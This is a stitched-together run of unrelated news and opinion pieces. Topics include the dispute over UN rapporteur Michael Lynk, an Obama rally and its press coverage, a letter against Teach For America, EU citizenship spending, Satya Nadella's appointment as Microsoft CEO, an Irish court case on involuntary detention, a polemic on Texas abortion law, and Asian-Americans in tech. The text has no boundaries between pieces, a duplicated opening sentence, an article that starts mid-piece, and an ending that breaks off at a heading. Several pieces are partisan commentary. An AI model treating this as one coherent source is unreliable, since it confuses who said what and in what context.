It's all more than a little ironic: Dion is publicly questioning Professor Lynk's ability to advance peace in the region — after having himself offered a lame justification for selling $15 billion worth of weapons to Saudi Arabia. It's all more than a little ironic: Dion is publicly questioning Professor Lynk's ability to advance peace in the region — after having himself offered a lame justification for selling $15 billion worth of weapons to Saudi Arabia.
As for UN Watch's general allegation that Lynk exclusively focuses on Israel and its alleged violations of human rights under the law, it overlooks something rather obvious. The stated mandate of the UN Special Rapporteur for the Palestinian Territories is to do just that — to report on the human rights violations of the occupiers. Michael Lynk did not write that mandate; he may yet tell the UN that he would like to see it changed.
Meanwhile, there is evidence to suggest that he is personally appalled by all acts of political or religious violence in the Middle East, regardless of the perpetrators. Joanna Quinn, director of the Centre for Transitional Justice and Post-Conflict at Western, tells iPolitics that Michael Lynk has a solid scholarly reputation.
“I would like to emphasize that Professor Lynk's scholarship and public outreach … have consistently held that there must be war crimes accountability for individuals involved both with Israel and with Palestine. His analysis has been fair-minded.”
Toronto lawyer and former University of Ottawa law prof William Kaplan seconds that opinion. “I have known and been a professional colleague of Michael Lynk for over thirty years,” he told iPolitics. “He is principled and honourable. This guy is even-handed and fair-minded … Instead of attacking him, and quoting him unfairly out of context, I wish everyone would take a deep breath, take a reflective look at his scholarship, and give him the chance to do his job and then judge him on the job he does.”
Lynk, of course, can speak for himself. In an op-ed piece which ran in the Toronto Star on August 11, 2014, he clearly states that both sides in the Israel-Hamas conflict of that year should have been worried about facing international law:
“First, the most recent violence in Gaza could result in charges against the leaders of both Hamas and Israel. Hamas's firing of missiles at Israeli civilians is undoubtedly a war crime, as are suicide bombers. But crimes by one side do not justify crimes by its opponents. The Israeli bombardment of densely populated neighbourhoods and United Nations schools in Gaza, resulting in enormous civilian deaths and injury tolls, suggests that the strict obligations under international law to protect civilians were frequently breached. War crimes included the reckless and negligent firing of munitions that do not strictly distinguish between military and civilian targets.”
Craig Scott, a professor at Osgoode Hall Law School and former Rhodes Scholar, has known Michael Lynk since the 1980s and has reviewed his scholarly work. In a March 26 letter to Dion, he called the work of UN Watch, as re-circulated by other groups, “a piece of character assassination.” He described Lynk's work as “careful, measured … and mainstream.”
In making that last claim, he noted that Lynk's conclusions were “shared by the large majority of independent legal scholars who work in the relevant fields of law, not to mention by the large majority of states' (foreign affairs) legal departments, with a few exceptions such as those of Israel, (to some extent) the U.S. and elements within the Harper-era bureaucracy.”
Scott reminded Dion that Lynk was asked to write a chapter on the Arab-Israeli conflict and international law by the prestigious Max Planck Encyclopedia of Public International Law — the gold standard resource for international law around the globe.
Nor was Scott the only person who expressed displeasure over Dion's public questioning of Lynk's qualifications for the UN job. Two other Canadian special UN rapporteurs have also written letters to Dion questioning the fairness and accuracy of his comments about Lynk.
It's all more than a little ironic: Dion is publicly questioning Lynk's ability to advance peace in the region after having himself offered a lame justification for selling $15 billion worth of weapons to the repressive dictatorship of Saudi Arabia — which, in addition to multiple human rights violations against dissidents and women, is waging a brutal war against neighbouring Yemen.
Nor is it clear how Dion's demand that officials in Geneva revisit Lynk's appointment will help Canada in the business of restoring the relationship with the UN that was shredded by the Harper regime (which includes getting a seat on the Security Council a few years down the road). After all, what is there to revisit? The vote on Lynk's appointment was 47-0, a number that represents nearly a quarter of the entire UN membership. The choice of a special rapporteur is entirely up to the UN, with no input required from Canada. Dion is questioning not just Lynk's competence, but also that of the institution that chose him.
Dion should know better than most people that, of all the 45-odd appointments similar to Lynk's made by the UN, the Special Rapporteur for the Palestinian Territories is clearly the toughest call. The position, which has been around since 1993, is voluntary and unpaid and must produce biennial reports on human rights violations in the Territories. And it is very, very unpopular with the Israeli government and its supporting lobbying groups.
In fact, Lynk was not the UN's first choice. That honour fell to Professor Penny Green. But objections raised over her candidacy by the same group that attacked Lynk knocked her out of the running.
Looking back at his predecessors, Michael Lynk can see the rocky road ahead. The last Special Rapporteur from Indonesia resigned after just 15 months because of a lack of cooperation from the Israeli government. But Lynk is keen to do the job. He has visited the region and worked for six months in Jerusalem in 1989. Despite Dion's slight, he would like to get the chance to talk to the man who wondered very publicly if he had the skills for the job.
“I would welcome the opportunity to meet with Minister Dion or his advisors to explain my mandate and qualifications. What's important to express to them is my commitment to human rights and international law. As Franklin Roosevelt once said, ‘Even a neutral has the right to take account of the facts.'”

“So I'm going to make a long speech in there. But I had to come to the folks who didn't get a seat. Because this is a group right here that is truly enthusiastic,” Obama said to much applause from the excited overflow crowd, which POOL reported “included more than a few shrieking women and girls.”
President Obama campaigned for gubernatorial candidate Anthony Brown in Maryland Sunday afternoon to a sold out crowd of 8,000, according to the Upper Marlboro Fire Marshall. This meant there were folks waiting in the Wise High School overflow room/gym, so POTUS was kind enough to stop in there and address them before the rally.
“Crowd shrieked again as POTUS wrapped up and made his way to the rope line,” Pool reported as Obama got ready to speak to a sold out crowd of 8,000 at Wise High School. So, many excited fans. Much love. People shouted “I love you!” at POTUS.
Here's where all of the love of a sold out rally got turned into a failure by the mainstream press. As President began his speech for Lieutenant Governor Anthony Brown, who is running on the Democratic ticket for Governor, folks seated in the front row near where the journalists were sitting (the event was open press) headed for the exit as soon as they got their photos of the President. The White House Pooler accurately noted, “… some in the crowd started leaving as soon as Obama started speaking and by the time he was about 10 minutes in, there was a traffic jam next to the pool's tables as folks tried to exit the gym.”
Politico White House reporter Jennifer Epstein elaborated by tweeting a photo (looks like one man leaving is even wearing an Obama t-shirt, so probably not a hater):
They got their iPhone photos, now they're streaming out: the 2014 Obama campaign rally story pic.twitter.com/gCbq6G7mjr — Jennifer Epstein (@jeneps) October 19, 2014
This set off a string excitement among main stream journalists (Jeff Mason, the Reuters White House Correspondent, Zeke Miller a political Reporter for TIME, and Gabriel Debenedetti, a national political correspondent for Reuters for starters), with Reuters' Debenedetti declaring it as “a story of 2014.”
Reuters being what it is, I cautioned myself that it might not be safe to assume this was dry commentary on the ridiculous state of our media setting their own stories and narratives and then confirming them within their bubble. (Remember the “Glitch” that ended the Obama Presidency and Obamacare? Yeah? Not so much.)
Cut to: Jeff Mason's article on The Story of 2014 is already up on Reuters and trending on Yahoo.
And it's enough to make you weep for this poor, unloved President and his loser party:
President Barack Obama made a rare appearance on the campaign trail on Sunday with a rally to support the Democratic candidate for governor in Maryland, but early departures of crowd members while he spoke underscored his continuing unpopularity. With approval levels hovering around record lows, Obama has spent most of his campaign-related efforts this year raising money for struggling Democrats, who risk losing control of the U.S. Senate in the Nov. 4 midterm election. Most candidates from his party have been wary of appearing with him during their election races because of his sagging popularity.
By “most candidates”, he means red state candidates. He should let us know when Republicans are this close to winning in blue state territory and they are campaigning with Bush. Oh, wait, Bush wasn't even allowed near the RNC in 2008.
Is the term “struggling Democrats” really apt in a midterm that historically favors the opposition party and in which Republicans are gerrymandered in the House and have access to seemingly unlimited dark money — and yet, is not looking anything like the GOP wave we've been promised, with Senate races that the GOP thought they had wrapped up tightening.
Also, Senate Democrats have outraised the Republicans. But so struggling.
Let us know when Republicans are “struggling”, or do we need to keep lowering the bar for them so that picking up a few seats in a historically advantaged midterm is going to be sold as “struggling Democrats”.
At any rate, anyone passing by might have gotten the idea that this is the beltway narrative, so you may soon be reading this as the Huge Obama Fail representative of his entire Year of Fail Six Years of Fail Life of Fail. That certainly would fit in with the media's continued belief in the Obama voters abandoning their President in 2012 (talk about failing).
Yes, it was odd (because see update, it was folks from the overflow room who weren't allowed to stay who were leaving), but it wasn't a narrative about Obama, unless you willfully disregard the shrieking and the sold out rally and the overflow necessity.
Jennifer Epstein surmised after the event:
Think it was probably trying to avoid bad traffic that the crowds streaming out of PG County Obama-Brown rally. Still, highly unusual. — Jennifer Epstein (@jeneps) October 19, 2014
And this alleged avoidance of a traffic jam caused by all of the people who wanted to see POTUS will now be used to confirm the belief that Obama is a failure with his own base. They fled, I tell you! FLED. It's The Story Some Want to Tell, but it's not the accurate story or the whole story. The White House pooler told the accurate story – this happened. It is odd. But it is not a story that tells the story of 2014. Also, the rally was sold out. Update 1 11:00 PM: It turns out the folks who left early were in the overflow room, so actually this was a big Obama success. Oh, Reuters. Your Obama hate is showing.
Ah: here's why folks left Obama-Brown rally early, from Md Dems: MT: @LewisYv They were in the overflow roomwhere he spoke 1st. That is why — Erin Cox (@ErinatTheSun) October 20, 2014
Update 2 11:09 PM: Josh Lederman , writing for the AP, brought some straight talk to his coverage because it's true—Maryland is Obama country and as he points out, the county went for Obama 9 out of 10 voters, so that's another big black mark in the attempt to turn a few people walking out into A Story Of The Year of Obama Fail:
Support for Obama still runs high in Democratic-leaning Maryland — and especially in Prince George's County, a heavily African-American corner of the state and Brown's home base. Roughly 9 in 10 voters in the county backed Obama in 2008. Just next to the high school where Obama held his rally sits Barack Obama Elementary School.
Oh, yeah. That's some hate Reuters. Well done.

A special education teacher in an elementary school wrote a letter to Seventh Generation complaining about their partnership with TFA, Inc.
This teacher has asked to remain anonymous but this is what they said about their role as a teacher:
The kids I serve range from twice exceptional (gifted and a disability) to cognitively low.
The disabilities my students have included autism, learning disabilities, TBI, mental health issues, behavior disorders, and more. Originally, I was the autism specialist, but the new district model is to throw all but the most disabled students into neighborhood schools, and declare all inclusion/resource teachers as generalist. It's been a terrible idea, especially since my caseload has doubled and I have lost an IA. I literally use all but about 15 minutes (lunch) a day to serve kids. I'm an experienced teacher with a high level of expertise in autism and learning disabilities, and a strong understanding of the IEP process. I can't imagine how a TFA could manage to do my job.
To follow is the letter:
I am extremely disappointed in Seventh Generation for your support for Teach
For America Trainees. Teach for America trainees may be called the best and
the brightest of their college classes, but that does not mean they have what
it takes to be good teachers. Nor does it mean that those of us who have
committed our careers to teaching public school are the worse and the
dimmest. Did you know that TFA trainees (Temps for African-Americans or
Teach for Awhile) are placed with high needs students after a 5-week summer
crash course? Did you know that they are only committed to staying for two
years, which increases the teacher churn of said high-needs urban schools?
Did you know that TFA trainees do not need to meet minimum state
qualifications to teach? Did you know that TFA charges districts a placement
fee? Did you know that TFA equates standardized test scores with actual
improvement in student learning? Did you know that TFA trainees are offered
high-profile jobs or guaranteed admittance into various business and law
schools?
I urge you to withdraw your support for Teach for America. Our students
deserve teachers who are committed to their teaching profession. A first
step of commitment is to seek and undergo the best professional training
available at a fully accredited university or a strong alternative
certification program. Please do not contribute to the
de-professionalization of teachers. Please do not perpetuate the falsehood
that anyone with a smart brain and a pre-written curriculum can teach.
Please help stop the diseased notion that test scores are paramount. There
is no need to bring TFA into our schools or to give them additional funding.
Consider that if TFA were truly committed to American children it would
deploy an army of tutors to work individually with high needs children.
Just so you know, I was at a social justice conference yesterday and a whole
bunch of us were talking about how we will not be buying your products.

Have you ever visited a restaurant or store that was really terrible, but had lots and lots of four- and five-star Yelp reviews? Maybe they're engaging in practices similar to a restaurant that Jennifer reviewed. They offered her a refund to change her poor review to four or five stars. She and her fiancé brought a large family group to a steakhouse for a pre-wedding “meet the family” dinner. Was it the second tip that the waiter added to their bill for himself, the extra $400 in seafood dinners added to their tab, or the the attempted sleight-of-hand with bottled water? She wrote about all of it, and the restaurant didn't like it. The refund, however, was only to come after she revised the original review and pretended the bad experience never happened. [More]
The European commission is to spend tens of millions more pounds on promoting the ideal of the EU citizen under plans drawn up by officials in Brussels in the wake of the Brexit vote.
Officials for the European parliament claim there is now a “clear need” for a significant increase in spending on the Europe for Citizens programme, which aims to foster the notion of an EU citizenry through remembrance events, town twinning and involvement in European parliamentary elections. The programme had its budget cut from €215m to €185.5m after a request from Britain in 2013.
“Considering the current political climate, in which an increasing number of citizens question the foundations of the EU, decisive action is indispensable,” an assessment of the programme by officials in the European parliament reports.
“It is for this reason that the reduction in funding for the EFC programme is a serious handicap to successful implementation: to reiterate, the budget for the current EFC programme is €185.5m (down from €215m under the previous programme), which amounts to merely 0.0171% of the EU multiannual financial framework.”
The aim of EFC is said to be that of developing “a better understanding” of the EU across all its member states, to fund remembrance events for key moments in European history and foster the ideal of European citizenship. The assessment document says that funding “which promotes and enables citizens to engage in European matters is of vital importance, especially in times when Euroscepticism is on the rise”.
It adds: “A reduction was requested by the United Kingdom government, as is apparent from a report of the UK House of Commons' European scrutiny committee regarding the EFC programme 2014-2020, and backed in the council.
“The latter report states that ‘in his letter of 31 October 2013, the minister for culture, communications and creative industries (Ed Vaizey) informed us that the government had succeeded in securing a reduction in the budget of the programme (down from €229m in the commission's original proposal to €185m)'...
“The reduced funding has undoubtedly entailed serious consequences for the functioning of the EFC programme as a whole.”
In 2015, from 2,800 applications for cash, 408 projects were selected for grants: 252 town twinning citizens meetings, 33 remembrance projects, 32 networks of twinned towns and 27 civil society projects.
Hungary had the greatest number of successful applications for cash (17%) followed by Slovakia (13%) and Italy and Germany (11%).
Earlier this month it emerged that Federica Mogherini, the EU's foreign policy chief, was preparing a timetable setting out steps to create EU military structures “to act autonomously” from Nato. Mogherini reportedly said: “We have the political space today to do things that were not really do-able in previous years.”
The military plan would see countries such as France, Germany, Italy, Spain and Poland forming permanent military structures to act on behalf of the EU and for the deployment of the EU's battle groups and 18 national battalions.
However, the British defence secretary Michael Fallon said he would veto any “common military force” as long as the UK was a member state of the EU. The European Council president Donald Tusk said Theresa May had told him during their meeting at Downing Street last week that she would be ready to trigger Article 50 to begin Brexit by February 2017.
The satirical website Nonciclopedia has shut, for an indefinite period, in the wake of apparent legal difficulties relating to an alleged complaint by the Italian rock star Vasco Rossi.
The nature of the complaint isn't clear, but the site is known for its satirical approach to the Wikipedia-style encyclopedia game. The site claims to have already removed the ‘offending' page, and it's not clear whether Rossi is still considering taking legal action against the site or the unknown editor who wrote the page's content.
There are also unconfirmed reports that police also became interested in the site. But the decision by Nonciclopedia to close in this way has sparked huge amounts of comment online, as Italians and people around the world react to the story.
Vasco Rossi is a popular and controversial Italian singer-songwriter who has released more than 25 albums during his career. He has been releasing music since the late 70's and his best known release is probably 1980's Colpa d'Alfredo, the title track of which was for a while reportedly was banned from Italian radio.

1775. In Massachusetts, the conflict between the British Empire and the American colonies becomes all out war. In the colony of New York, the Six Nations - or “League of Peace and Power” – must decide if they are going to participate in the war, and alongside whom. In the Mohawk River Valley a mestizo world exists. It is a great community of Indians, Irish and Scottish, founded by Sir William Johnson, Superintendent of Indian Affairs appointed by King George. The thunder of war is heard in Boston and continues getting closer, old bonds are broken, the land that Sir William called "Iroquoireland" becomes a scene of hate and resentment. The war chief Joseph Brant Thayendanegea has to make a decision and set off, taking his people far from their native land, going beyond the world he has always known. WU MING is a collective of Italian fiction writers, founded in Bologna in January 2000. Its books include the bestselling novel Q, published under the group's previous pseudonym, Luther Blissett, and the Cold War thriller 54.
After what seems like months of speculation and rumor, we finally know that the hotly-tipped Satya Nadella is to replace Steve Ballmer as Microsoft's CEO. There were several names in the running, but Nadella has been the favorite for some time. His appointment certainly does not come as a great shock; but is he the right choice. Put simply: yes.
Some commentators have expressed concerned that he has no previous experience of running a company — and Microsoft is a gigantic ship to steer — but we should be careful not to concentrate on this too much. Running Microsoft, or any other company for that matter, is far from being a one-man show. As CEO, Nadella will ultimately have the final say, but just as President Obama does not run the US single-handedly, neither is the CEO responsible for every single aspect of the day to day running of a company.
What is important to remember is that Nadella is far from being a Microsoft virgin; this is a man who joined the company more than 20 years ago. This is invaluable experience as it means he already has knowledge of the inner workings of the company — and having seen how things look from slightly lower down the ladder, he probably already has ideas for changes and improvements that could be made.
this is a man who joined the company more than 20 years ago
Nadella is used to working on the cutting edge at Microsoft. He has worked on Office, Bing, cloud computing, enterprise venture, Skype and Xbox, to name but a few. This is a man with a great deal of experience to draw upon. In recent years, Microsoft has shown a propensity towards online services so it is hard to think of someone better qualified to move things forward. In particular, Nadella's experience in the enterprise arm of Microsoft will stand him in good stead.
Cornerstone of Microsoft, Bill Gates is also going to be on hand. Some had thought that the company founder could all but sever ties with Microsoft, and thankfully this did not turn out to be the case. By not only remaining on the board but also taking on a new role as technology advisor, Gates will be there for the hand-holding stage that Nadella will have to go through, and it is hard to imagine that he will ever be more than a phone call or email away should the new CEO feel the need for a little help.
It seems that the appointment has been generally well-received. Microsoft stock rose after the announcement — not by much, but it went in the right direction. It is understandable that there will be some trepidation. With only Bill Gates and Steve Ballmer having been at the helm before, Nadella has a great deal to live up to.
he already has knowledge of the inner workings of the company
The new CEO has something of a different image to his predecessors. At just 46, Nadella is fairly young, but he has a very young-at-heart feel to him. His appointment is reminiscent of the energy President Obama gave off at the start of his first term. It is important not to place too much emphasis on race, but it is great to see that the new CEO is not just another white, middle-age, middle-class, middle of the road man in a suit. It was time for something different, and the right decision has been made.
There's a life and excitement that has been lacking in recent years. It's hard to say what will happen in the coming years, but Nadella seems like a man who won't be afraid to take risks, to look at the bigger picture and not turn to quick fixes. He knows Microsoft, and Microsoft knows him. He is the perfect choice and will take Microsoft forward in ways that an outsider simply would not have been able to.
What do you think? Is the appointment the injection of new blood that Microsoft needs?

Part of Brandon Sanderson's original pitch package for The Way of Kings , out now from Tor books. At the very beginning of the story, Szeth commits a murder which sparks a great conflict that drives the events through which so many will suffer or triumph. Fun trivia bit: in the first draft of the book that Brandon sent me, the line above was the first line in the novel (it shifted deeper in the final edit, though it still opens a chapter. You can read it for free on Tor.com if you sign in).Brandon actually had me illustrate several main characters from his manuscript, but only this image of Szeth made it (in a small part) into the book. Brandon's made a clear decision (which I agree with) not to define the faces of his characters in the book's concept art and illustrations any further than needed, so as to not force the reader to accept any one particular vision of how the characters look beyond the features defined in the text. That is to say, if I imagine that Kaladin looks like a certain actor, and you imagine that he looks like your brother, and someone else imagines that he looks like that cute boy in her class, so long as those visions don't directly contradict the description in the book (which is pretty loose), we're all equally correct. That personal image of a character's face in our mind is part of what makes our individual reading experiences unique and personal, and neither he nor I would want to mess with that.Given the role that the 20 illustrations created by Isaac Stewart, Greg Call and myself play in the book, this was a necessary mandate.But here I was trying to illustrate the shame and sadness that appear in Szeth's character even as he performs unforgiveable actions, so I purposefully hid his face as an expression of humility. This makes this probably the only main character illustration from the book which anyone is likely to see from me (at least until we collect everything into an art book, some day).His Shardblade is atypically small compared to others, about the size of a normal sword. Brandon allowed me a bit of license with the belt tone (not being white).I had an absolute blast conceptualizing and illustrating the plant and animal illustrations that do appear within the novel itself, but there's a lot of concept work that took place leading up to those drawings which won't see print for a while (at least until we collect an art book, which needs a few more volumes to fill up). He was kind enough to allow me to pick out a few choice bits and put them online for you to see, while we wait.©2008-2010 Brandon Sanderson, all rights reserved.is an awesome novel.

In a Wall Street Journal story by Lorraine Luk, Foxconn Chairman Terry Gou met with Google Robotics Division Andy Rubin in Taipei recently and they discussed new robotic technologies.
Gou was excited by new automation technologies demonstrated by Rubin. Rubin asked Gou to help integrate the robotic companies that Google acquired to target the areas of manufacturing and electronics assembly that Google plans for their future.
Foxconn and Google are calling this collaboration (which has been going on since last year) a “cooperation.” The Wall Street Journal said that the cooperation was focused on improving robotic automation to compete with companies like Amazon in retailing.
“Foxconn needs Google's help to step up automation at its factories as the company has the lowest sales per employee among the contract makers, given its large workforce,” said Wanli Wang, an analyst at CIMB Securities. “Using robots to replace human workers would be the next big thing in the technology industry. Not just Google, other major technology companies such as Microsoft and Amazon also have been developing robotics technology to capture future growth opportunities.”
Foxconn has sent some engineers to Massachusetts Institute of Technology to learn the latest manufacturing and automation technology. The company has been branching out from just being a contract manufacturer by selling various mobile accessories it has manufactured. Last August, Google purchased a number of display-related patents from Foxconn including head-mounted technology enabling superimposing of images a la Google Glass. Although the patent purchase was likely a safeguarding step to beef up Google's patent portfolio as they near coming to market with Google Glass, it was also the beginning of a relationship between the two companies. And early 2013, Foxconn launced their new robotics research facility in Taiwan.

A High Court judge has said the costs of legal proceedings by the HSE aimed at keeping an 18-year-old woman with a severe personality disorder in a specialised unit in England against her wishes would fund a “purpose-built” unit for her in Ireland.
The costs to date of various proceedings in Ireland and England concerning the woman are estimated to exceed well over €1 million.
It also costs £400,000 (€560,000) a year to keep her in St Andrew's unit in Northampton, where other Irish children and adults are regularly detained .
The woman has been detained for 19 months in St Andrew's. Before that, from age 14, she was treated in various units in Ireland for some two years.
When Mr Justice Seamus Noonan observed the costs of the case would fund a purpose-built unit for the woman here, Gerry Durcan SC, for the woman, said the legal costs of similar cases involving vulnerable young people over the last 20 years would pay for an entire “purpose-built system”.
Eleven barristers, including six senior and five junior counsel, and at least five solicitors are involved in the latest case, brought by the HSE, before Mr Justice Noonan.
It raises important issues, including whether the involuntary detention in St Andrew's, when the Irish Mental Health Acts prohibit detention of adults with personality disorders, breaches the woman's rights under the Constitution and European Convention on Human Rights.
Most of the doctors agree that, as of now, she has capacity to make decisions about her treatment.
The HSE wants the woman to stay in St Andrew's and she wants to return to Ireland, as provided for by the High Court in an order last March.
Voluntarily co-operate
It directed a care plan and other arrangements be put in place in time for the woman to return earlier this month. She has told the judge via videolink from Northampton she will voluntarily co-operate with treatment here.
The HSE claims circumstances have changed since the March order and has appealed that order to the Court of Appeal.
Pending that appeal, it has asked Mr Justice Noonan to vary the March order to keep the woman in St Andrew's in the hope she will co-operate with a form of therapy considered the “gold standard” for her condition.
Doctors involved with her treatment have said they consider her a high suicide risk.
Lawyers for the woman, her estranged parents and her court-appointed guardian, all of whom are separately represented, accept she is a suicide risk but disagree her circumstances have changed materially since last March.
It has also been argued the HSE took no effective steps to put measures in place allowing for her treatment here.
The HSE argues she cannot be effectively treated here and her condition is best managed in St Andrew's.
In evidence to the court, a psychiatrist who dealt with the woman in Ireland said there is a tension between her liberty, her right to live in the land of her birth and her need for treatment.
He considered it was in her best interests to have her condition managed in St Andrew's.
That facility was best placed to provide her with treatment and while she had declined it, it could be offered again.
If she continued to refuse it, she should, after a specific time, be permitted to return, he believed.
Kept alive
He agreed she had been detained in hospitals here and England effectively for the past four years, with little improvement in her condition. However, she has been kept alive, he said.
If permitted to return home, the woman should not be subject to imposition of in-patient admission, he said. Should she opt for treatment in Ireland, the services here would be offered to her, he said.
His concern is about staffing, he said. Ireland does not have the resources available to large countries, and does not have the most appropriate facility to treat people with this form of personality disorder.
When Mr Durcan said Ireland does not detain people with personality disorders, the doctor said other jurisdictions do.
The Irish psychiatric services can manage most people apart from a “tiny minority” being treated in England, he added.
Mr Durcan said a medical report of August 2014 set out a view on what was necessary to be put in place for when the woman turned 18 this year, but it seemed there was no contact between the Irish adult mental health services and St Andrew's concerning the woman's possible treatment in Ireland for some six months after that report was produced.
The psychiatrist said he disagreed the analytic therapy recommended in that report was appropriate for the woman.
The necessary specialist service is just not available here - he could not “conjure up” such a service and nor did he think such was a good idea.
In her evidence via videolink to the court last week, the woman said the “most important thing” for her was “to be returned back to my country”.
She said she would not take her own life and has many plans for the future.
David Dewhurst and the clutch of self-righteous religious fanatics in charge of Texas are set to all but outlaw abortion here. Why? Because “the restrictions are a top priority for the Christian conservative voters who make a majority of Texas Republican voters and want abortions banned.”
This anti-constitutional legislation is motivated not by what science tells us about the procedure in particular, women's health in general, or the practice of medicine more broadly, but by religious fundamentalism. Luckily for people who love America, we have the Enlightenment-inspired secular Constitution, and in a battle between our foundational document and Reverend Dewhurst's Big Book of Magical Bronze-Age Life Advice, the Constitution wins. This is true even where, as here, the residents of Magictown redefine time in order to codify an unconstitutional infringement on women's rights.
The American Congress of Obstetricians and Gynecologists – a professional organization of more than 58,000 members – published an extraordinary open letter this week in the Austin American-Statesman pointing out that the legislation is simply at odds with reality and medical necessity:
Facts are very important, especially when discussing the health of women and the American public. And a lot of “facts” are being asserted in this debate. Truth be told, the scientific underpinnings of this legislation are unsound. First, there's the 20-week ban, which is based on the argument that a fetus can feel pain. Recent and rigorous scientific reviews have concluded that there is no evidence of fetal perception of pain until 29 weeks at the earliest (third trimester is 28–40 weeks). These bills would also impose a number of requirements for abortion facilities that are touted as necessary to ensure the health of the woman, but are, in fact, unnecessary and unsupported by scientific evidence. These proposed requirements, concerning door width and other irrelevant issues, would only make it extremely difficult or impossible for most clinics, including clinics that primarily provide important non-abortion well-woman health care services such as mammograms and prenatal care to low-income women, to stay open. For example, the bills would require physicians who perform abortions to have admitting privileges at a hospital within 30 miles and allow abortions only in clinics that meet surgical clinic standards, imposing government regulations on abortion care that are much stricter than for colonoscopy and other similar low-risk procedures. The fact is that abortion is one of the safest medical procedures, with minimal—less than 0.5%—risk of major complications that might need hospital care.
The letter is footnoted with citation to what reality-averse, self-interested, bible-thumping magical thinkers like Dewhurst wouldn't recognize and are obviously unconcerned with – science.
ACOG's Dr. Barbara Levy was on KPFT Friday. Being a liberal elitist who doesn't understand Real America, she argued that doctors are some kind of authorities on matters of science and where they form a consensus (like they do here), we ought to defer to them. This is nonsense, of course, so I channeled Dewhurst, pointing out that just because doctors have fancy medical degrees doesn't mean that they have some superior knowledge of medicine. I won the debate, obviously, but you can judge for yourself here:
Often Employees, Rarely CEOs: Challenges Asian-Americans Face In Tech
A new report on diversity in Silicon Valley shows that Asians and Asian-Americans are well-represented in lower-level positions — but, in comparison, severely underrepresented at the management and executive levels at five large, established tech companies.
Listen to Part Two Listen · 4:22 4:22
Ascend, an Asian-American professional organization based in New York, found that although 27 percent of professionals working at those companies are Asian or Asian-American, fewer than 19 percent of managers, and just under 14 percent of executives, are.
Asian women are especially underrepresented. Out of all the Asian-American women working in tech, only 1 in 285 is an executive. That compares to a ratio of 1 executive per 118 professionals in the workforce as a whole — and, for white men in tech, a ratio of 1 in 87, reports Ascend.
Why are so few of the Asians and Asian-Americans working in tech breaking into management? Four Asians in the tech industry — two U.S.-born and two foreign-born — shared their experiences and perspectives with NPR's Arun Rath. They noted the importance of role models, the burden of expectations — and, in the case of Asians born abroad — the challenge of obtaining a visa.
The View From The Executive Suite
Korean-American Yul Kwon won Survivor: Cook Islands in 2006. At the time, he was a well-credentialed business consultant, a graduate of Stanford and Yale Law School, with stints on Capitol Hill and Google on his resume. But he had been bullied as a child and felt there were no Asian-American role models on television when he was growing up. So it was important to him that other Asians see a fellow Asian who was smart, physically fit, speaking perfect English — and leading.

These days, leading is exactly what he's doing. Now 40, Kwon is the deputy chief privacy officer at Facebook.
By attaining such a position in Silicon Valley, Kwon has done something that's proven difficult for many Asians to achieve. "I think over the course of my life and over my career, I've learned to act almost contrary to what my natural instincts are," he says. "So I still am very much of an introvert. I still find it difficult to speak up in meetings. I still get really nervous speaking in public."
Kwon says that things are improving for Asians in Silicon Valley — and now that he's in a position of influence at Facebook, it's something he thinks about a lot.
"I think one of the challenges for a lot of Asian-Americans, including me - you know, you can't help but feel a little sheepish talking about these issues because you don't want it to seem as though you're self-serving. But, you know, for me, I feel like I've been very fortunate. I feel like this is something I need to do to give back to the community."
A Startup Cofounder, Chasing A 'Yes'
Chenny Zhang, 26, grew up in San Jose and was an intern with the New England Patriots. She quit her job at Cisco last year and recently moved to Beijing to focus on her English language-learning startup, called Merch. Zhang and Merch's cofounders expect to close their first round of funding next week.

"Being Chinese and being a woman, you kind of are expected to be more timid and shy," she says. "You're just expected to work hard and do your job."
Zhang meets alone with American investors; a Chinese colleague accompanies her to meetings with Chinese investors. It's been tough.
She says it's hard to identify the difference between the challenges facing any startup, and the challenges specific to her, as a female, Asian-American startup founder. She says it's hard to get a venture capitalist to say "yes" — "but that could be true for any start-up."
Still, she says right now, only about one out of five venture capitalists are openly interested in women entrepreneurs.
But that number is growing, she says.
Visa First, App-Founding Second
Kwon and Zhang are U.S.-born Asian-Americans. Asians who were born overseas confront additional challenges in the tech world — like the obstacle of attaining visas.
Huong Tran, 34, born and raised in Vietnam, started her own business there and then became the first postwar Vietnamese student to be admitted to Stanford University's Graduate School of Business. She struggled to adjust. "We believe that hard work and not necessarily self-promotion will get you ahead," she says. "I think that doesn't hold the same here."
Enlarge this image toggle caption Courtesy of Huong Tran Courtesy of Huong Tran
She came to Stanford with the goal of starting another business in the U.S. "But the hurdles of getting an H-1B sponsorship and visa and whatnot really changed how I think about my employment opportunities," she says.
So instead of starting her business straight out of school, Tran accepted a job offer from Yahoo. She worked there until about six months ago — long enough to get her green card. Now she runs a home-swapping app called Magpie.
Karan Chaudhry, born in India and another Stanford grad, is still on an H-1B visa. If you have a startup, as Chaudhry does, you must prove you have a legitimate business with some real cash on hand to obtain that visa.
Chaudhry says he has already raised several million dollars but was rattled by his visa meetings. "It is really scary, like you're literally toying with your career," he says. "If that doesn't get approved, the funding is off — or even though the funding is in, you will not be the person who is the CEO."
So why take the risk?
Well, he says, he's passionate about his company, DropThought, which is a real-time customer feedback platform for businesses.
Role Models, Skill Sets And A Broader Issue
Chaudhry also says he and a lot of other Asians strike out on their own because of what he calls the glass ceiling. He describes a Catch-22 situation: Without more established Asian role models or executives, it's tougher for younger ones to move up. But, he says, there is hope. "I think with Satya Nadella becoming the CEO of Microsoft and immigrant companies becoming super successful, I think that balance will change," he says. "But it will not happen overnight."
"I think with Satya Nadella becoming the CEO of Microsoft and immigrant companies becoming super successful, I think that balance will change. But it will not happen overnight."
Chaudhry says he thinks Americans have an advantage, thanks to the way they're brought up with an emphasis on all-around development, including sports and socializing rather than just academics. In a venture-capital world, where people who are fit and charismatic get more funding, that is vital.
He wishes more companies would work to help their Asian-born employees with communications skills and other skills — rather than passing them over for promotions. "If people have the smarts and they have the right people for the job, let's not throw the baby out with the bathtub, and let's work on some of the areas that can actually be improved with coaching," he says.
Tran agrees that there's a problem — lots of Asians in the funnel; few making it to the top. But Asians aren't the only people affected. "I think the message is broader than that," Tran says. "We need more diversity."
Annual celebration of Black history
Black History Month, also known as African-American History Month in the U.S., is an annual observance in Canada, Ireland, the Netherlands, the United Kingdom, and the United States. It began as a way for remembering important people and events in the history of the African diaspora. It is celebrated annually in the United States[6] and Canada[7] in February, as well as in the United Kingdom, the Netherlands and Republic of Ireland[8][9] in October.[5]
History
Negro History Week (1926)
